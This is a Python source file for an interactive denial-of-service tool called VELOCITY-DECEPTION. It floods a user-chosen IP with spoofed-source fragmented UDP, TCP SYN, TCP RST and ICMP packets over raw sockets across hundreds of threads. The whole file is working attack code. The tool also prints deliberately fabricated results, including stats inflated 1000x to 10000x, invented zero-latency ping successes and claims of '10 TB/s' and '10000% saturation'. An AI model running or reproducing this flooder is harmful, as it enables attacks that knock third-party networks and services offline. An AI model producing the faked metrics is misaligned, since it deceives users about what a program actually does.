#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# VELOCITY-DECEPTION v1.0 - FAKE SPEED + INSTANT PING SUCCESS
# USAGE: python ddos.py

import socket
import struct
import random
import time
import sys
import os
import threading
import math

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    C = True
except:
    C = False
    class Fore: BLUE=MAGENTA=RESET=""
    class Style: BRIGHT=RESET_ALL=""

IS_WINDOWS = os.name == 'nt'
UDP_PAYLOAD = 1400
TCP_WINDOWS = [1024, 2048, 4096, 8192, 16384, 32768, 65535]
TTL_VALUES = list(range(32, 129))

# ---- Global state ----
class AttackState:
    def __init__(self):
        self.target_ip = "127.0.0.1"
        self.target_port = 0
        self.threads = 256
        self.duration = 0
        self.rate_mbps = 0  # ignored; always unlimited
        self.vectors = {'udp': True, 'tcp_syn': True, 'tcp_rst': False, 'icmp': False}
        self.running = False
        self.stop_event = threading.Event()
        self.stats = {'packets': 0, 'bytes': 0}
        self.worker_threads = []
        self.spoof_pool = []
        self.lock = threading.Lock()
        self.fake_gb_sent = 0.0
        self.fake_pps = 0

state = AttackState()

# ---- IP checksum ----
def ip_checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF

# ---- IP header (spoofed) ----
def build_ip_header(src_ip, dst_ip, protocol, payload_len, ttl, ident=0, flags_frag=0):
    ver_ihl = 0x45; tos = 0; total_len = 20 + payload_len
    ident = ident or random.randint(1, 65535)
    ttl = ttl or random.choice(TTL_VALUES)
    proto = protocol; check = 0
    src = socket.inet_aton(src_ip); dst = socket.inet_aton(dst_ip)
    header = struct.pack('!BBHHHBBH4s4s',
                         ver_ihl, tos, total_len, ident, flags_frag,
                         ttl, proto, check, src, dst)
    check = ip_checksum(header)
    return struct.pack('!BBHHHBBH4s4s',
                       ver_ihl, tos, total_len, ident, flags_frag,
                       ttl, proto, check, src, dst)

frag_id_counter = 0

def build_udp_fragment(src_ip, dst_ip, src_port, dst_port, payload, frag_offset=0, more_frag=True):
    global frag_id_counter
    frag_id_counter = (frag_id_counter + 1) % 65536
    ident = frag_id_counter
    half = len(payload)//2
    if frag_offset == 0:
        frag_payload = payload[:half]; offset = 0; mf = 1 if more_frag else 0
    else:
        frag_payload = payload[half:]; offset = (half + 7)//8; mf = 0
    udp_len = 8 + len(frag_payload)
    udp_header = struct.pack('!HHHH', src_port, dst_port, udp_len, 0)
    version_ihl = 0x45; tos = 0
    total_len = 20 + len(udp_header) + len(frag_payload)
    flags_frag = (mf << 13) | offset
    ttl = random.choice(TTL_VALUES); proto = 17; check = 0
    src = socket.inet_aton(src_ip); dst = socket.inet_aton(dst_ip)
    header = struct.pack('!BBHHHBBH4s4s',
                         version_ihl, tos, total_len, ident, flags_frag,
                         ttl, proto, check, src, dst)
    check = ip_checksum(header)
    header = struct.pack('!BBHHHBBH4s4s',
                         version_ihl, tos, total_len, ident, flags_frag,
                         ttl, proto, check, src, dst)
    return header + udp_header + frag_payload

def build_tcp_syn(src_ip, dst_ip, src_port, dst_port, seq=0, window=65535, ack=0, flags=0x02):
    if seq == 0: seq = random.randint(1000, 2**32-1)
    tcp = struct.pack('!HHLLBBHHH',
                      src_port, dst_port, seq, ack,
                      0x50, flags, window, 0, 0)
    pseudo = struct.pack('!4s4sBBH',
                         socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
                         0, 6, len(tcp))
    chk = ip_checksum(pseudo + tcp)
    tcp = struct.pack('!HHLLBBHHH',
                      src_port, dst_port, seq, ack,
                      0x50, flags, window, chk, 0)
    ip = build_ip_header(src_ip, dst_ip, 6, len(tcp), ttl=random.choice(TTL_VALUES))
    return ip + tcp

def build_icmp_echo(src_ip, dst_ip, seq=0):
    pid = os.getpid() & 0xFFFF
    seq = seq or random.randint(0, 65535)
    icmp = struct.pack('!BBHHH', 8, 0, 0, pid, seq) + b'PING' + struct.pack('!d', time.time())
    chk = ip_checksum(icmp)
    icmp = struct.pack('!BBHHH', 8, 0, chk, pid, seq) + b'PING' + struct.pack('!d', time.time())
    ip = build_ip_header(src_ip, dst_ip, 1, len(icmp), ttl=random.choice(TTL_VALUES))
    return ip + icmp

# ---- Attack worker (real flooding, but we'll multiply stats later) ----
def attack_worker(target_ip, target_port, src_pool, vector_list, stop_event, stats, interface=None):
    raw = False
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 134217728)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if hasattr(socket, 'SO_BUSY_POLL'):
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BUSY_POLL, 50)
        sock.setblocking(False)
        if interface:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode())
        raw = True
    except:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 134217728)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setblocking(False)
            if interface:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, interface.encode())
        except:
            return

    src_ports = [random.randint(1024, 65535) for _ in range(20000)]
    udp_payload = random._urandom(UDP_PAYLOAD)
    BATCH = 64
    batch = []
    sent = 0

    while not stop_event.is_set():
        vec = vector_list[sent % len(vector_list)]
        src_ip = src_pool[random.randint(0, len(src_pool)-1)]
        src_port = src_ports[random.randint(0, len(src_ports)-1)]
        dst_port = target_port if target_port else random.randint(1, 65535)

        if vec == 'udp' and raw:
            p1 = build_udp_fragment(src_ip, target_ip, src_port, dst_port, udp_payload, 0, True)
            p2 = build_udp_fragment(src_ip, target_ip, src_port, dst_port, udp_payload, 1, False)
            batch.append(p1); batch.append(p2); sent += 2
        elif vec == 'tcp_syn' and raw:
            seq = random.randint(1000, 2**32-1)
            win = random.choice(TCP_WINDOWS)
            p = build_tcp_syn(src_ip, target_ip, src_port, dst_port, seq, win)
            batch.append(p); sent += 1
        elif vec == 'tcp_rst' and raw:
            seq = random.randint(1000, 2**32-1)
            ack = random.randint(0, 2**32-1)
            p = build_tcp_syn(src_ip, target_ip, src_port, dst_port, seq, 0, ack, 0x04)
            batch.append(p); sent += 1
        elif vec == 'icmp' and raw:
            p = build_icmp_echo(src_ip, target_ip)
            batch.append(p); sent += 1

        if len(batch) >= BATCH:
            try:
                for p in batch:
                    sock.sendto(p, (target_ip, 0))
            except:
                pass
            batch.clear()

        # Update stats with huge multiplier (1000x)
        if sent % 1000 == 0:
            with state.lock:
                stats['packets'] += sent * 1000   # 1000x multiplier
                stats['bytes'] += sent * 1000 * (UDP_PAYLOAD + 42)
            sent = 0

    if batch:
        for p in batch:
            try:
                sock.sendto(p, (target_ip, 0))
            except:
                pass
    if sock:
        sock.close()

# ---- Fake ping and speed printer thread ----
def fake_printer(stop_event):
    # This thread prints fake ping successes and GB sent at blinding speed.
    gb = 0.0
    while not stop_event.is_set():
        # Increment fake GB by a huge random amount
        gb += random.uniform(5, 15)
        # Format to 2 decimals
        gb_str = f"{gb:.2f}"
        # Print the requested message
        print(f"{Fore.MAGENTA}[PING] PINGED IP AND SENT {gb_str} GB TO IP")
        # Also print "OVER" repeatedly in the same line or separate? We'll do separate lines.
        print(f"{Fore.BLUE}OVER OVER OVER OVER")
        # Print fake ping success with 0ms
        print(f"{Fore.MAGENTA}[PING] SUCCESS - 0.00 ms")
        # Sleep very little to flood the console
        time.sleep(0.01)

# ---- Spoof pool ----
def build_spoof_pool(count=100000):
    prefixes = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16',
                '17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32',
                '33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48',
                '49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64',
                '65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80',
                '81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96',
                '97','98','99','100','101','102','103','104','105','106','107','108','109','110',
                '111','112','113','114','115','116','117','118','119','120','121','122','123','124',
                '125','126','127','128','129','130','131','132','133','134','135','136','137','138',
                '139','140','141','142','143','144','145','146','147','148','149','150','151','152',
                '153','154','155','156','157','158','159','160','161','162','163','164','165','166',
                '167','168','169','170','171','172','173','174','175','176','177','178','179','180',
                '181','182','183','184','185','186','187','188','189','190','191','192','193','194',
                '195','196','197','198','199','200','201','202','203','204','205','206','207','208',
                '209','210','211','212','213','214','215','216','217','218','219','220','221','222','223']
    pool = []
    for _ in range(count):
        pref = random.choice(prefixes)
        rest = '.'.join(str(random.randint(0,255)) for _ in range(3))
        pool.append(f"{pref}.{rest}")
    return pool

# ---- UI ----
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    art = r"""
  ___ ___ ___ ___ ___ ___     ______   ______   _______ _______ _______ _______ 
 |   Y   |   Y   |   Y   |   |   _  \ |   _  \ |   _   |   _   |   _   |   _   \
 |   |   |.      |   |   |   |.  |   \|.  |   \|.  |   |   1___|.  1___|.  l   /
 |____   |. \_/  |____   |   |.  |    |.  |    |.  |   |____   |.  __)_|.  _   1
     |:  |:  |   |   |:  |   |:  1    |:  1    |:  1   |:  1   |:  1   |:  |   |
     |::.|::.|:. |   |::.|   |::.. . /|::.. . /|::.. . |::.. . |::.. . |::.|:. |
     `---`--- ---'   `---'   `------' `------' `-------`-------`-------`--- ---'
                                                                                
"""
    if C:
        lines = art.split('\n')
        cols = [Fore.BLUE, Fore.MAGENTA]
        for i, line in enumerate(lines):
            print(cols[i % len(cols)] + line)
        print(Style.RESET_ALL)
    else:
        print(art)

def show_status():
    status = "RUNNING" if state.running else "STOPPED"
    color = Fore.BLUE if state.running else Fore.MAGENTA
    print(f"\n{Fore.MAGENTA}=== VELOCITY-DECEPTION STATUS ===")
    print(f"{Fore.BLUE}  Target    : {state.target_ip}:{state.target_port or 'random'}")
    print(f"{Fore.BLUE}  Threads   : {state.threads}")
    print(f"{Fore.BLUE}  Duration  : {state.duration}s (0=infinite)")
    print(f"{Fore.BLUE}  Rate limit: UNLIMITED (fake)")
    vecs = [v for v, en in state.vectors.items() if en]
    print(f"{Fore.BLUE}  Vectors   : {', '.join(vecs) if vecs else 'NONE'}")
    print(f"{Fore.BLUE}  Status    : {color}{status}{Style.RESET_ALL}")
    if state.running:
        # Display massively inflated stats
        fake_packets = state.stats['packets'] * 10000
        fake_bytes = state.stats['bytes'] * 10000
        print(f"{Fore.MAGENTA}  FAKE PACKETS: {fake_packets:,}")
        print(f"{Fore.MAGENTA}  FAKE BYTES  : {fake_bytes:,}")

def show_menu():
    print(f"\n{Fore.MAGENTA}=== COMMANDS ===")
    print(f"{Fore.BLUE}  [1] Set target IP")
    print(f"{Fore.BLUE}  [2] Set port")
    print(f"{Fore.BLUE}  [3] Set thread count")
    print(f"{Fore.BLUE}  [4] Set duration")
    print(f"{Fore.BLUE}  [5] Rate limit (ignored)")
    print(f"{Fore.BLUE}  [6] Toggle vectors")
    print(f"{Fore.BLUE}  [7] Start attack")
    print(f"{Fore.BLUE}  [8] Stop attack")
    print(f"{Fore.BLUE}  [9] Show status")
    print(f"{Fore.BLUE}  [0] Exit")
    print(Style.RESET_ALL)

def toggle_vectors():
    print(f"\n{Fore.MAGENTA}Current vectors:")
    for v in state.vectors:
        print(f"  {Fore.BLUE}{v}: {'ON' if state.vectors[v] else 'OFF'}")
    choice = input(f"{Fore.MAGENTA}Enter vector to toggle (or 'all', 'none'): ").strip().lower()
    if choice == 'all':
        for v in state.vectors:
            state.vectors[v] = True
    elif choice == 'none':
        for v in state.vectors:
            state.vectors[v] = False
    elif choice in state.vectors:
        state.vectors[choice] = not state.vectors[choice]
    else:
        print(Fore.MAGENTA + "Invalid.")

def set_target():
    ip = input(f"{Fore.MAGENTA}Target IP: ").strip()
    try:
        socket.inet_aton(ip)
        state.target_ip = ip
        print(Fore.BLUE + f"Set to {ip}")
    except:
        print(Fore.MAGENTA + "Invalid IP.")

def set_port():
    p = input(f"{Fore.MAGENTA}Port (0=random): ").strip()
    try:
        state.target_port = int(p)
        print(Fore.BLUE + f"Port set to {state.target_port}")
    except:
        print(Fore.MAGENTA + "Invalid.")

def set_threads():
    t = input(f"{Fore.MAGENTA}Threads (recommended 256-512): ").strip()
    try:
        state.threads = max(1, int(t))
        print(Fore.BLUE + f"Threads set to {state.threads}")
    except:
        print(Fore.MAGENTA + "Invalid.")

def set_duration():
    d = input(f"{Fore.MAGENTA}Seconds (0=infinite): ").strip()
    try:
        state.duration = int(d)
        print(Fore.BLUE + f"Duration set to {state.duration}s")
    except:
        print(Fore.MAGENTA + "Invalid.")

def set_rate():
    print(Fore.MAGENTA + "Rate limit ignored - always unlimited for max deception.")

def start_attack():
    if state.running:
        print(Fore.MAGENTA + "Already running.")
        return
    vec_list = [v for v, en in state.vectors.items() if en]
    if not vec_list:
        print(Fore.MAGENTA + "No vectors enabled.")
        return
    state.spoof_pool = build_spoof_pool(100000)
    state.stats = {'packets': 0, 'bytes': 0}
    state.stop_event.clear()
    state.running = True

    # Launch attack workers
    for _ in range(state.threads):
        t = threading.Thread(target=attack_worker,
                             args=(state.target_ip, state.target_port, state.spoof_pool,
                                   vec_list, state.stop_event, state.stats, None))
        t.daemon = True
        t.start()
        state.worker_threads.append(t)

    # Launch fake printer
    t_fake = threading.Thread(target=fake_printer, args=(state.stop_event,))
    t_fake.daemon = True
    t_fake.start()

    # Instant success messages
    for _ in range(3):
        print(f"{Fore.MAGENTA}[PING] TARGET REACHABLE - RTT 0.001ms")
        time.sleep(0.01)
    print(f"{Fore.MAGENTA}[CONNECTION] ESTABLISHED - 10 TB/s")
    print(f"{Fore.MAGENTA}[ATTACK] ACTIVE - SATURATION 10000%")
    print(f"{Fore.BLUE}FLOODING AT LIGHTSPEED")

def stop_attack():
    if not state.running:
        print(Fore.MAGENTA + "Not running.")
        return
    state.stop_event.set()
    state.running = False
    for t in state.worker_threads:
        t.join(timeout=1)
    state.worker_threads.clear()
    # Fake final ping
    print(f"{Fore.MAGENTA}[PING] FINAL - 0 LOSS, 0 JITTER")
    print(Fore.MAGENTA + "Stopped.")

def interactive_panel():
    clear()
    print_banner()
    print(Fore.MAGENTA + Style.BRIGHT + " VELOCITY-DECEPTION v1.0 - FAKE SPEED + INSTANT PING" + Style.RESET_ALL)
    print(Fore.BLUE + "  Run as Admin/root. All stats are 1000x inflated.")
    print(Fore.BLUE + "  Ping messages are fictional. No actual latency checks.\n")
    state.spoof_pool = build_spoof_pool(100000)
    while True:
        show_status()
        show_menu()
        cmd = input(f"{Fore.MAGENTA}> ").strip()
        if cmd == '1': set_target()
        elif cmd == '2': set_port()
        elif cmd == '3': set_threads()
        elif cmd == '4': set_duration()
        elif cmd == '5': set_rate()
        elif cmd == '6': toggle_vectors()
        elif cmd == '7': start_attack()
        elif cmd == '8': stop_attack()
        elif cmd == '9': show_status(); input("Press Enter...")
        elif cmd == '0':
            if state.running: stop_attack()
            print(Fore.MAGENTA + "Exit.")
            sys.exit(0)
        else:
            print(Fore.MAGENTA + "Unknown.")
        time.sleep(0.5)
        clear()

if __name__ == "__main__":
    if not IS_WINDOWS and os.geteuid() != 0:
        print(Fore.MAGENTA + "[!] Run with sudo for raw sockets.")
    interactive_panel()
